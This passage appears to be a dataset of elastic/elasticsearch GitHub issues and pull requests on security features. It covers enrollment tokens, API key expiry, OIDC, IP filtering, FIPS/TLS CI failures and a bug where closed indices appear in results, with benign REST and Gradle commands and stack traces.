elastic/elasticsearch,1112771810,"Elasticsearch should not generate node enrollment token by default if the node is configured for single node discovery","We should not generate node enrollment token when discovery type is set to single node, even if the node listens on non-localhost addresses.","Pinging @elastic/es-security (Team:Security)",no,">bug,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,1368203461,"[DOCS] Add `ssl.verification_mode` to secure settings","Adds documentation for the `xpack.security.http.ssl.verification_mode` setting in the secure settings page, and removes this setting from the `docker-compose.yml` file in the Docker installation guide.

Closes #85375","Documentation preview:
  - ✨ [Changed pages](https://elasticsearch_89981.docs-preview.app.elstc.co/diff)Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)@ywangd, I updated the existing definition for `verification_mode` so that it can be used consistently throughout the TLS/SSL pages. This is a much cleaner implementation, so thanks for pointing out the existing block so that we can improve reuse and have cleaner source code ✋ 5️⃣  Please re-review when you can. ",yes,">docs,:Security/TLS,Team:Docs,Team:Security,auto-backport-and-merge,v8.3.4,v8.6.0,v8.4.4,"
elastic/elasticsearch,754176340,"Allow forcing a limit on api keys","Currently, the expiration of api keys can be provided at creation time. If the expiration is not provided the api key will never expire:
> By default, API keys never expire. You can specify expiration information when you create the API keys.

Similiar to [this password strength issue](https://github.com/elastic/elasticsearch/issues/29913) and the token setting `xpack.security.authc.token.timeout` I would like to have the option to specify the maximum lifetime of an api key:
If the administrator sets `xpack.security.authc.api_key.expiration` to `180d` and the user does not provide an expiration date when creating the api key the resulting api key will expire after 180 days.
If the administrator sets `xpack.security.authc.api_key.expiration` to `180d` and the user provides an expiration date of `30d` when creating the api key the resulting api key will expire after 30 days.
If the administrator sets `xpack.security.authc.api_key.expiration` to `180d` and the user provides an expiration date of `365d` when creating the api key the creation should fail with an error.","Pinging @elastic/es-security (Team:Security)It is unlikely that we will do this with a global setting.
Features such as [Kibana Alerting and Actions](https://www.elastic.co/guide/en/kibana/7.10/alerting-getting-started.html) and [Fleet](https://www.elastic.co/guide/en/fleet/7.10/index.html) depend on API Keys and would be significantly complicated if they needed to accommodate such local policies.

We _might_ at some future time, expand the existing RBAC model to support individual restrictions on API Key expiry, but it's not on our roadmap right now. ",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,335986871,"OAuth2 / OIDC Realm","We need an OAuth2 / Open ID Connect realm.

Kibana has an issue for this
https://github.com/elastic/kibana/issues/18189","Pinging @elastic/es-securityAny update on this?It's available now in 7.2
https://www.elastic.co/guide/en/elastic-stack-overview/current/oidc-guide-authentication.html

Be aware that your client id cannot contain special characters (at least I know of / and : for sure)
See #43709 

",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317449128,"[DOCS] Integrate information about ABAC ","*Original comment by @lcawl:*

Information about attribute-based access control needs to be added to the security documentation. There is currently information in:
https://www.elastic.co/blog/attribute-based-access-control-with-xpack
LINK REDACTED","[docs issue triage]
Leaving open. Still relevant.

Here's where we currently link to the ABAC blog post:
https://www.elastic.co/guide/en/elasticsearch/reference/master/authorization.html#attributesIt seems really strange to link to a 6.1 blog post in our current docs. I wonder if it's possible to get the blog itself updated to be more version agnostic (maybe give a range of versions) while you're waiting for the content to land in the guide.",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1242893300,"[CI] CoreWithSecurityClientYamlTestSuiteIT suite failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/a2yd3pjyfwexy/tests/:x-pack:qa:core-rest-tests-with-security:yamlRestTest/org.elasticsearch.xpack.security.CoreWithSecurityClientYamlTestSuiteIT/test%20%7Byaml=indices.put_mapping%2Fall_path_options_with_types%2Fput%20one%20mapping%20per%20index%7D

**Reproduction line:**
`./gradlew ':x-pack:qa:core-rest-tests-with-security:yamlRestTest' --tests ""org.elasticsearch.xpack.security.CoreWithSecurityClientYamlTestSuiteIT"" -Dtests.method=""test {yaml=indices.put_mapping/all_path_options_with_types/put one mapping per index}"" -Dtests.seed=C69385F38E27DE6C -Dtests.locale=sr-Latn-BA -Dtests.timezone=US/Eastern -Druntime.java=17 -Dtests.fips.enabled=true`

**Applicable branches:**
7.17

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.CoreWithSecurityClientYamlTestSuiteIT&tests.test=test%20%7Byaml%3Dindices.put_mapping/all_path_options_with_types/put%20one%20mapping%20per%20index%7D

**Failure excerpt:**
```
java.lang.AssertionError: Failure at [indices.put_mapping/all_path_options_with_types:2]: expected [2xx] status code but api [indices.create] returned [401 Unauthorized] [{""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/test_index1?error_trace=true]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/test_index1?error_trace=true]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}]

  at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.executeSection(ESClientYamlSuiteTestCase.java:482)
  at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.test(ESClientYamlSuiteTestCase.java:446)
  at jdk.internal.reflect.GeneratedMethodAccessor12.invoke(null:-1)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:833)

  Caused by: java.lang.AssertionError: expected [2xx] status code but api [indices.create] returned [401 Unauthorized] [{""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/test_index1?error_trace=true]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/test_index1?error_trace=true]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}]

    at org.junit.Assert.fail(Assert.java:88)
    at org.elasticsearch.test.rest.yaml.section.DoSection.execute(DoSection.java:375)
    at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.executeSection(ESClientYamlSuiteTestCase.java:471)
    at org.elasticsearch.test.rest.yaml.ESClientYamlSuiteTestCase.test(ESClientYamlSuiteTestCase.java:446)
    at jdk.internal.reflect.GeneratedMethodAccessor12.invoke(null:-1)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:568)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
    at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
    at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
    at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
    at java.lang.Thread.run(Thread.java:833)

```",,no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,476450967,"ES Indices /GET api return closed indices if they have aliases assigned.","
<!-- Bug report -->

**Elasticsearch version**: 7.1.0, 7.2.0

**Plugins installed**: [analysis-icu, analysis-smartc, analysis-phonetic]

**JVM version** : bundled 

**OS version**: Ubuntu 18.04.2 

**Description of the problem including expected versus actual behavior**: 

**Actual**: Elasticsearch Indices /GET API return **closed** indices if they has assigned aliases.
**Expected**: ES should return only opened indices.

Aliases are unique to closed indices, and there are no opened indices sharing same aliases.

**Steps to reproduce**:

 1. Create new index
 2. Put alias to this index
 3. Close index
 4. Execute `GET http://elasticsearch.host:9200/*` to get list of indices including closed just now.
 5. Delete alias from closed index.
 6. Execute `GET http://elasticsearch.host:9200/*`  to get list of indices without closed one.

","Pinging @elastic/es-distributedHey @SthPhoenix ,

Thanks for this bug report.

I am not sure I see the problem here. The most typical API to get a list of indices is `GET _cat/indices` (or `GET _aliases`). Using either API the state of the index after closing it seems correct to me whether there is an alias or not.

#### Testing closing an index without an alias shows:

```
DELETE testindex
```
```
PUT testindex
```
```
GET /_cat/indices
yellow open testindex            ygpMPnV1R1SCc-DwP6-IlQ 1 1 0 0   230b   230b
```
```
GET /_aliases
{
  ""testindex"" : {
    ""aliases"" : { }
  }
}
```

```
POST /testindex/_close
```
```
GET /_cat/indices
yellow close testindex            ygpMPnV1R1SCc-DwP6-IlQ 1 1                  
```
```
GET /_aliases
{
  ""testindex"" : {
    ""aliases"" : { }
  }
}
```

#### Testing closing an index with an alias shows:

```
DELETE testindex
```

```
PUT testindex
```

```
POST /_aliases
{
  ""actions"": [
    {
      ""add"": {
        ""index"": ""testindex"", ""alias"": ""testalias""
      }
    }]
}
```
```
GET /_cat/indices
yellow open testindex            fAq8AxBASpasUPJdAE2OmA 1 1 0 0   230b   230b
```
```
GET /_aliases
{
""testindex"" : {
    ""aliases"" : {
      ""testalias"" : { }
    }
  }
}
```

```
POST /testindex/_close
```

```
GET /_cat/indices
yellow close testindex            fAq8AxBASpasUPJdAE2OmA 1 1                  
```

```
GET /_aliases
{
  ""testindex"" : {
    ""aliases"" : {
      ""testalias"" : { }
    }
  }
}
```Yes, `_cat ` API works as intended. Problem is that [Get Index](https://www.elastic.co/guide/en/elasticsearch/reference/current/indices-get-index.html) API have inconsistent behavior.

Actually I noticed it while using official python [client](https://elasticsearch-py.readthedocs.io/en/master/), where `es.indicies.get('*')` in previous versions of ES returned only opened indices, and after 7.1 it start returning closed ones.@SthPhoenix I can't reproduce this (on 7.2.0 at least):

I tried:

1. Created index (`PUT testindex`)
2. Assign alias
    ```
    POST /_aliases
    {
      ""actions"": [
        {
          ""add"": {
            ""index"": ""testindex"", ""alias"": ""testalias""
          }
        }]
    }
    ```
3. Check `GET _all` (or `GET *`) and shows the open index as expected.
4. Close index (`POST /testindex/_close`)
5. Check `GET _all` (or `GET *`) and the closed index `testindex` isn't listed.

Are these the same reproduction steps you followed?
I am using python client (7.0.0) for this, but yes, steps are the same. For checking indices list I also used curl.
Tested today on ES 7.3, got the same bug.
 If it might be the case, this is not clean install, ES was updated step by step from ES 6.5.1> For checking indices list I also used curl.

To clarify: if you follow my [earlier steps](https://github.com/elastic/elasticsearch/issues/45171#issuecomment-518631527) using curl, does step 5. i.e. `curl -H 'Content-Type:application/json' <es_url:es_port>/_all?pretty` list `testindex`?Yes, using curl gives same strange behavior. 
Also tested this with clean docker containers 7.1 to 7.3 - and it works just as expected, that's weird. I'll test it more thoroughly and let you know if I could figure out the reason.@SthPhoenix Did you manage to reproduce or to figure out the reason?

Looking at the code, the GET Indices API should only return opened indices on 6.x, 7.x and master as it uses the ""strict expand open"" option.

It is possible that the Elasticsearch Python Client sets a different indices options that allow closed indices to be included in the response, but looking at the client code it does not seem to be the case.

Also, I'm curious to know if any of the clusters you tested have the Security enabled?Hi @tlrx ! I won't  have access to the cluster with this error till the end of next week.

> It is possible that the Elasticsearch Python Client sets a different indices options that allow closed indices to be included in the response, but looking at the client code it does not seem to be the case.

Since this behavior is also reproduced with curl requests, I think  ES python client is out of question.

> Also, I'm curious to know if any of the clusters you tested have the Security enabled?

Yes, I have security enabled on the cluster. 
I have updated to ES 7.1, enabled security and later found this issue, but disabling security didn't help.
@SthPhoenix Thanks for the extra information.

> Since this behavior is also reproduced with curl requests, I think ES python client is out of question.

Agreed, I just wanted to double check.



> Yes, I have security enabled on the cluster.

That's what I suspected, and indeed this bug can be reproduced on 7.1/7.2 (maybe also later versions) but it only appears when security is enabled.

Pinging @elastic/es-securityI have checked it on a single node with security. Yes, it looks like the bug can be reproduced only with security enabled. 
Also GET API returns closed indices only if mask applies to alias, i.e. if index name is _test_index_ and it's alias is _test_alias_ index will be returned for masks like: `*, test*, test_*`, and won't be returned for masks like `test_i*`Connected bug found:
Search requests to _all indices or with mask which fit to alias of closed index fails with ""index closed exception""This is the same root problem as https://github.com/elastic/elasticsearch/issues/32238.

Unfortunately this is a [limitation when security is enabled](https://github.com/elastic/elasticsearch/blob/cb230e5/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/IndicesAndAliasesResolver.java#L412-L418) which has been around, essentially forever and is _very_ hard to fix unless we either:
1. change the security model to _not_ respect [privileges on aliases](https://github.com/elastic/elasticsearch/issues/29874)
2. redesign wildcard resolution in core ES to be pluggable (so security can do just-in-time expansion, which _might_ make some of these cases a bit simpler).

Another option is to change how [expand_wildcards](https://www.elastic.co/guide/en/elasticsearch/reference/current/multi-index.html) works in core (breaking change) so as to make it compatible with how Security currently functions.

Wildcards that match aliases that point to both closed and open indices can be made to expand to only open, closed indices or both . To honor this option ES core needs wildcards in the index expression . But the Security Filter cannot forward wildcards.

We could deprecate `expand_wildcards` in favor of `expand_aliases` with a similar behavior but for aliases not wildcards.",no,":Security/Security,Team:Security,"
elastic/elasticsearch,505893821,"Per Node Ip Filter in cluster settings","<!-- Feature request -->

Currently we are setting the `xpack.security.http.filter.allow` directive in elasticsearch.yml to secure our nodes. The configuration is different for master / data nodes and ingest /coordination nodes. This implies that we cannot use  `xpack.security.http.filter.allow` as a cluster setting (https://www.elastic.co/guide/en/elasticsearch/reference/current/cluster-update-settings.html), as currenly `xpack.security.http.filter.allow` is for all nodes in the cluster.

See also https://discuss.elastic.co/t/per-node-ip-filters-in-cluster-settings/199384

Using cluster update settings is much more dynamic then the elasticsearch.yml configuration files. As we require separate `xpack.security.http.filter.allow` settings for data, ingest and search clients, it would be a nice to have feature to no longer having to restart all nodes when you need to update `xpack.security.http.filter.allow`. 

","Pinging @elastic/es-security (:Security/Security)We discussed this in today's team meeting. We see value in such a functionality but we are currently lacking the settings infrastructure to do per node type cluster settings. There are other projects/initiatives that run in parallel that might benefit from such an infrastructure so we will revisit this when/if it is in place",no,":Security/Security,Team:Security,"
elastic/elasticsearch,732648332,"SunJSSE in FIPS mode TLS1.3 issues","TLS1.3 is backported to 8 in the latest release ( openjdk8u-272 ) and adoptopenjdk picked it up too https://blog.adoptopenjdk.net/2020/10/adoptopenjdk-8u272-1109-and-1501-available/

This means that we are now hitting the issue [we hit with zulu8](https://github.com/elastic/elasticsearch/issues/61316#issuecomment-685482708) a few weeks back, for the same reasons. 

[adoptopenjdk-8 jobs in our periodic fips matrix](https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+7.9+matrix-java-periodic-fips/ES_RUNTIME_JAVA=adoptopenjdk8,nodes=general-purpose/213/) started failing already since we upgraded to u272 and our java8 jobs will start failing soon too. 

We should

- Raise an issue upstream with the Bouncy Castle folks
- (Potentially) raise an issue upstream with JDK
- Temporarily change our CI setup to use BCJSSE even in Java 8 in FIPS mode, in order not to lose too much test coverage until we
- Set up one (or two, one for oracle java and one for adoptopenjdk) job in the fips matrix that uses a jdk 8 version that is pinned to the last one before u272   ","Pinging @elastic/es-security (:Security/Security)> For the time being, change our CI setup to use BCJSSE even in Java 8 in FIPS mode ( i.e. sunset SunJSSE entirely for our FIPS CI testing )

Doesn't the effectively mean that we'd drop any real support for SunJSSE-FIPS, without warning, in a minor release, just because it doesn't work on the most recent JDKs, even though it does work on older JDKs and we technically still support them.

An alternative would be to decide to maintain a CI job that uses the last non-TLS1.3 JDK8 release in the same way that we maintain testing on old Operating Systems. Our assumption in CI had been that new JDK builds (within the same version) have relatively minor changes and we get the best testing outcome by being on the latest build. I think in this case that assumption is no longer true. The latest JDK8 builds have a big difference (as far as we're concerned) and we should at least consider what that means for CI.
Good points Tim. ""For the time being"" meant to denote a temporary solution for our CI until we can get a fix merged upstream. But that ""temporary"" might take a long time and your suggestion makes total sense. I updated the issue description to reflect thatProbable Failure: https://gradle-enterprise.elastic.co/s/kwpmchxcrn6ri

T13 == TLS1.3??

```
08:36:41   1> javax.net.ssl.SSLHandshakeException: No available authentication scheme
08:36:41   1> 	at sun.security.ssl.Alert.createSSLException(Alert.java:131) ~[?:?]
08:36:41   1> 	at sun.security.ssl.Alert.createSSLException(Alert.java:117) ~[?:?]
08:36:41   1> 	at sun.security.ssl.TransportContext.fatal(TransportContext.java:311) ~[?:?]
08:36:41   1> 	at sun.security.ssl.TransportContext.fatal(TransportContext.java:267) ~[?:?]
08:36:41   1> 	at sun.security.ssl.TransportContext.fatal(TransportContext.java:258) ~[?:?]
08:36:41   1> 	at sun.security.ssl.CertificateMessage$T13CertificateProducer.onProduceCertificate(CertificateMessage.java:972) ~[?:?]
08:36:41   1> 	at sun.security.ssl.CertificateMessage$T13CertificateProducer.produce(CertificateMessage.java:961) ~[?:?]
08:36:41   1> 	at sun.security.ssl.SSLHandshake.produce(SSLHandshake.java:421) ~[?:?]
08:36:41   1> 	at sun.security.ssl.ClientHello$T13ClientHelloConsumer.goServerHello(ClientHello.java:1152) ~[?:?]
08:36:41   1> 	at sun.security.ssl.ClientHello$T13ClientHelloConsumer.consume(ClientHello.java:1088) ~[?:?]
08:36:41   1> 	at sun.security.ssl.ClientHello$ClientHelloConsumer.onClientHello(ClientHello.java:725) ~[?:?]
08:36:41   1> 	at sun.security.ssl.ClientHello$ClientHelloConsumer.consume(ClientHello.java:693) ~[?:?]
08:36:41   1> 	at sun.security.ssl.SSLHandshake.consume(SSLHandshake.java:377) ~[?:?]
08:36:41   1> 	at sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:444) ~[?:?]
08:36:41   1> 	at sun.security.ssl.SSLEngineImpl$DelegatedTask$DelegatedAction.run(SSLEngineImpl.java:968) ~[?:?]
08:36:41   1> 	at sun.security.ssl.SSLEngineImpl$DelegatedTask$DelegatedAction.run(SSLEngineImpl.java:955) ~[?:?]
08:36:41   1> 	at java.security.AccessController.doPrivileged(Native Method) ~[?:1.8.0_272]
```",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,684690473,"docs: add link from DLS/FLS page to limitations","the documentation for document level security & field level security
does not mention that there are certain limitations to the query. this
is however documented on a separate page, but no link to it exists.
this cost me quite a bit of time to find that page (and, to be honest,
that page is also lacking: it does not document *why* these things are
not supported).

i have now added the link. though please note that i'm not 100% certain
if the deeplink will work with this asciidoc format since the
documentation (https://github.com/elastic/docs) does not offer an
example for this.","Pinging @elastic/es-security (:Security/Authorization)Pinging @elastic/es-docs (>docs)",yes,">docs,:Security/Authorization,Team:Docs,"
elastic/elasticsearch,1383493483,"[CI] RoleMappingFileSettingsIT testRoleMappingFailsToWriteToStore failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/xxc4tgiv3w4lu/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.integration.RoleMappingFileSettingsIT/testRoleMappingFailsToWriteToStore

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.integration.RoleMappingFileSettingsIT.testRoleMappingFailsToWriteToStore"" -Dtests.seed=7D1CDDA0A19FBE98 -Dtests.locale=be -Dtests.timezone=Africa/Kinshasa -Druntime.java=18`

**Applicable branches:**
main

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.integration.RoleMappingFileSettingsIT&tests.test=testRoleMappingFailsToWriteToStore

**Failure excerpt:**
```
java.io.IOException: access denied: /dev/shm/elastic+elasticsearch+main+periodic+java-matrix/x-pack/plugin/security/build/testrun/internalClusterTest/temp/org.elasticsearch.integration.RoleMappingFileSettingsIT_7D1CDDA0A19FBE98-001/tempDir-003/SUITE-0/config/operator/settings.json

  at __randomizedtesting.SeedInfo.seed([7D1CDDA0A19FBE98:9847861B4628847B]:0)
  at org.apache.lucene.tests.mockfile.WindowsFS.checkDeleteAccess(WindowsFS.java:116)
  at org.apache.lucene.tests.mockfile.WindowsFS.deleteIfExists(WindowsFS.java:165)
  at java.nio.file.Files.deleteIfExists(Files.java:1191)
  at org.elasticsearch.integration.RoleMappingFileSettingsIT.cleanUp(RoleMappingFileSettingsIT.java:143)
  at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
  at java.lang.reflect.Method.invoke(Method.java:577)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:1004)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

